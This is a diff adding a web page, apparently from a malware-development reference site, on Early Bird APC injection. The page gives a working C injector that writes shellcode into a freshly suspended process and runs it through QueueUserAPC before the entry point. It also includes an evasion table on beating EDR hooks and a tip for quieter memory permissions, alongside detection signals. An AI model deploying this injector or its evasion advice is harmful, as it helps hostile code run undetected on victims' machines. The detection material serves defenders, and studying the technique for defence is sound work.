@@ -1,0 +1,159 @@
+---
+title: Early Bird APC Injection
+mitre: T1055.004
+category: injection
+group: APC Variants
+summary: Queue a shellcode APC to a freshly created suspended process before its first instruction runs.
+platform: [Windows]
+tags: ['C / C++', 'APC', 'x64']
+updated: '2026-08-04'
+author: thehackersbrain
+readingTime: 7 min read
+callChain:
+  - call: CreateProcessW(CREATE_SUSPENDED)
+    desc: Spawn a benign host binary suspended so its primary thread has not yet entered the alertable wait.
+    dll: kernel32
+  - call: VirtualAllocEx + WriteProcessMemory
+    desc: Map shellcode into the remote process address space.
+    dll: kernel32
+  - call: QueueUserAPC(shellcode_addr, hThread)
+    desc: Queue an APC to the primary thread while it is still in its loader initialisation.
+    dll: kernel32
+  - call: ResumeThread
+    desc: The thread enters its first alertable state during ntdll initialisation and drains the APC queue — shellcode runs before the process entry point.
+    dll: kernel32
+detections:
+  - src: SYSMON EID 8
+    text: CreateRemoteThread or QueueUserAPC targeting a newly created suspended process within milliseconds of creation.
+  - src: ETW-TI
+    text: NtQueueApcThread on the primary thread of a process in CREATE_SUSPENDED state.
+  - src: BEHAVIOURAL
+    text: A process resumed from suspended state whose first thread start address is not the loader's LdrInitializeThunk.
+  - src: MEMORY SCAN
+    text: Executable shellcode in an anonymous RX region that is the first code the primary thread executes.
+related:
+  - mitre: T1055.004
+    title: APC Injection
+    desc: The standard variant — queuing to an existing alertable thread instead of the initial suspended thread.
+    href: /techniques/injection/apc-injection
+  - mitre: T1055.012
+    title: Process Hollowing
+    desc: Replaces the image before resume; Early Bird queues code rather than replacing the image.
+    href: /techniques/injection/process-hollowing
+  - mitre: T1134.004
+    title: Parent PID Spoofing
+    desc: Combine with PPID spoofing to control which parent the host process shows.
+    href: /techniques/evasion/parent-pid-spoofing
+labKit:
+  - label: early_bird.c + Makefile
+    href: 'https://github.com/thehackersbrain/maldev-lab-kit'
+  - label: Sigma rule pack
+    href: /detections
+---
+
+import Callout from '../../../components/Callout.astro';
+import CallChain from '../../../components/CallChain.astro';
+import CodeBlock from '../../../components/CodeBlock.astro';
+import DetectionGrid from '../../../components/DetectionGrid.astro';
+import RelatedList from '../../../components/RelatedList.astro';
+
+## Overview
+
+Early Bird is a variant of APC injection that queues the payload APC to a process's primary
+thread while the thread is still suspended and executing ntdll initialisation. When `ResumeThread`
+is called, the thread enters an alertable state during `LdrInitializeThunk`, the APC queue drains,
+and the shellcode runs **before** the process entry point is ever reached.
+
+The evasion advantage over classic APC injection is timing: the payload executes before most
+AV/EDR hooks are in place (many hooks are installed during or after process initialisation) and
+before the host process has made any suspicious API calls that would draw scrutiny to its
+thread state.
+
+<Callout type="note">
+  "Early Bird" became a named technique after a 2018 CyberArk blog post. The underlying primitive
+  — `QueueUserAPC` to a suspended thread — has existed since Windows XP. The name has stuck in
+  tooling and detection rule naming.
+</Callout>
+
+## The call chain
+
+<CallChain steps={frontmatter.callChain} />
+
+## Reference implementation
+
+<CodeBlock
+  file="early_bird.c"
+  label="C"
+  lang="c"
+  class="mb-7.5"
+  code={`#include <windows.h>
+
+// Minimal msfvenom/custom shellcode placeholder
+extern const unsigned char sc[];
+extern const size_t sc_len;
+
+void early_bird_inject(const wchar_t *host_binary) {
+    STARTUPINFOW si        = { sizeof si };
+    PROCESS_INFORMATION pi = {0};
+
+    // 1. Spawn the host binary in a suspended state
+    if (!CreateProcessW(host_binary, NULL, NULL, NULL,
+                        FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
+        return;
+
+    // 2. Allocate RX memory and write shellcode into the remote process
+    PVOID remote = VirtualAllocEx(pi.hProcess, NULL, sc_len,
+                                  MEM_COMMIT | MEM_RESERVE,
+                                  PAGE_EXECUTE_READWRITE);
+    WriteProcessMemory(pi.hProcess, remote, sc, sc_len, NULL);
+
+    // 3. Queue the APC to the primary (and only) thread while it is suspended
+    //    The thread will drain this APC during ntdll init before reaching the EP
+    QueueUserAPC((PAPCFUNC)remote, pi.hThread, 0);
+
+    // 4. Resume -- shellcode fires during LdrInitializeThunk alertable state
+    ResumeThread(pi.hThread);
+
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+}`}
+/>
+
+<Callout type="caution">
+  Allocating `PAGE_EXECUTE_READWRITE` in one shot is the loudest part of this sample. The
+  cleaner pattern is RW → write → VirtualProtectEx to RX before queuing the APC.
+</Callout>
+
+## Why it works
+
+Windows APC delivery requires the target thread to enter an "alertable" wait state. Normal APC
+injection targets existing threads that call `WaitForSingleObjectEx`, `SleepEx`, or similar.
+
+Early Bird exploits the fact that `LdrInitializeThunk` — the ntdll function that performs
+loader initialisation — internally calls `NtTestAlert`, which drains the APC queue. This happens
+automatically when a suspended thread is resumed, making the primary thread of any
+`CREATE_SUSPENDED` process an implicit APC target on `ResumeThread`.
+
+## Evasion properties
+
+| Property | Notes |
+|---|---|
+| Hooks not yet installed | Many EDR hooks run in `DLL_PROCESS_ATTACH`; shellcode runs before that |
+| No remote thread creation | Avoids `CreateRemoteThread` — uses APC instead |
+| Legitimate host binary | Process token, path, and signature all belong to the host |
+| Short detection window | Process exists for milliseconds before APC executes |
+
+The technique still produces a `QueueUserAPC` call to a remote process, which ETW-TI records
+regardless of user-mode hook state. The timing advantage is real but not absolute.
+
+## Detection
+
+<DetectionGrid items={frontmatter.detections} />
+
+The most reliable signal is correlating process creation with `CREATE_SUSPENDED` against an
+immediate `QueueUserAPC` to the new process's primary thread, followed by `ResumeThread` —
+all within a single parent process's lifetime, typically within a few milliseconds.
+
+## Variants & related
+
+<RelatedList items={frontmatter.related} />
